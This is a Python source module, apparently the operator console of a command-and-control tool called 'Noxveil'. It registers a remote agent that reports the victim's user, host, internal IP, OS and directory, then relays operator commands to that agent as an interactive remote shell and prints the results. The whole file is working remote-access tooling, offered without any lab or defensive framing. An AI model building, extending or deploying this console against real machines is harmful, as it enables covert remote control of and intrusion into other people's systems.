


import threading
import queue
import sys
import os
import time
from datetime import datetime
from typing import Optional, Dict, Any


cmd_queue = queue.Queue()      
out_queue = queue.Queue()      
agent_info: Dict[str, Any] = {}  


class AgentSession:
    
    
    def __init__(self):
        self.registered = False
        self.last_seen: Optional[datetime] = None
        self.hostname: str = ""
        self.username: str = ""
        self.os_info: str = ""
        self.internal_ip: str = ""
        self.pwd: str = ""
    
    def update_info(self, data: str):
        
        for line in data.split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                key = key.strip()
                value = value.strip()
                
                if key == 'user':
                    self.username = value
                elif key == 'host':
                    self.hostname = value
                elif key == 'ip':
                    self.internal_ip = value
                elif key == 'os':
                    self.os_info = value
                elif key == 'pwd':
                    self.pwd = value
        
        self.registered = True
        self.last_seen = datetime.utcnow()
    
    def __str__(self) -> str:
        return (f"{self.username}@{self.hostname} | "
                f"IP: {self.internal_ip} | OS: {self.os_info[:30]}")


session = AgentSession()


def print_colored(text: str, color: str = "white"):
    
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "white": "\033[97m",
        "reset": "\033[0m"
    }
    print(f"{colors.get(color, '')}{text}{colors['reset']}")


def commander():
    
    print_colored("\n╭" + "─" * 60 + "╮", "cyan")
    print_colored("│  Noxveil Interactive Shell — Type commands, 'exit' to quit │", "cyan")
    print_colored("╰" + "─" * 60 + "╯", "cyan")
    
    
    while not session.registered:
        try:
            msg = out_queue.get(timeout=1)
            if msg == "__REG__":
                break
        except queue.Empty:
            continue
    
    print_colored(f"\n[+] Agent connected: {session}", "green")
    print_colored(f"[*] Current directory: {session.pwd}", "yellow")
    print_colored("[*] Shell ready.\n", "green")
    
    while True:
        try:
            
            prompt = f"\033[91m{session.username}@{session.hostname}\033[0m"
            prompt += f":\033[94m{session.pwd}\033[0m$ "
            
            try:
                cmd = input(prompt)
            except (EOFError, KeyboardInterrupt):
                print_colored("\n[*] Interrupted", "yellow")
                cmd_queue.put("__EXIT__")
                time.sleep(1)
                return
            
            if not cmd.strip():
                continue
            
            if cmd.strip().lower() in ("exit", "quit", "bye"):
                print_colored("[*] Sending exit signal to agent...", "yellow")
                cmd_queue.put("__EXIT__")
                time.sleep(1)
                return
            
            
            if cmd.startswith("!"):
                local_cmd = cmd[1:].strip()
                if local_cmd == "info":
                    print_colored(f"\nAgent Information:", "cyan")
                    print_colored(f"  Hostname: {session.hostname}", "white")
                    print_colored(f"  User: {session.username}", "white")
                    print_colored(f"  IP: {session.internal_ip}", "white")
                    print_colored(f"  OS: {session.os_info}", "white")
                    print_colored(f"  PWD: {session.pwd}", "white")
                    print_colored(f"  Last Seen: {session.last_seen}", "white")
                elif local_cmd == "clear":
                    os.system("clear")
                elif local_cmd == "help":
                    print_colored("\nLocal Commands (prefix with !):", "cyan")
                    print_colored("  !info   - Show agent information", "white")
                    print_colored("  !clear  - Clear screen", "white")
                    print_colored("  !help   - Show this help", "white")
                    print_colored("  exit    - Close connection and exit", "white")
                continue
            
            
            cmd_queue.put(cmd)
            
            
            try:
                output = out_queue.get(timeout=60)
                
                if output and output != "__NOP__":
                    
                    if output.startswith("[+]"):
                        print_colored(output, "green")
                    elif output.startswith("[-]"):
                        print_colored(output, "red")
                    else:
                        print(output)
                        
            except queue.Empty:
                print_colored("[!] Timeout — no response from agent (60s)", "red")
                
        except Exception as e:
            print_colored(f"[!] Error: {e}", "red")
            continue


def get_command() -> str:
    
    try:
        cmd = cmd_queue.get(timeout=30)
        return cmd
    except queue.Empty:
        return "__NOP__"


def submit_output(output: str):
    
    out_queue.put(output)


def register_agent(data: str):
    
    session.update_info(data)
    out_queue.put("__REG__")


if __name__ == "__main__":
    print_colored("\n⚠️  This module is meant to be imported, not run directly", "red")
    print_colored("⚠️  Use: from http_commander import commander\n", "red")
    sys.exit(1)
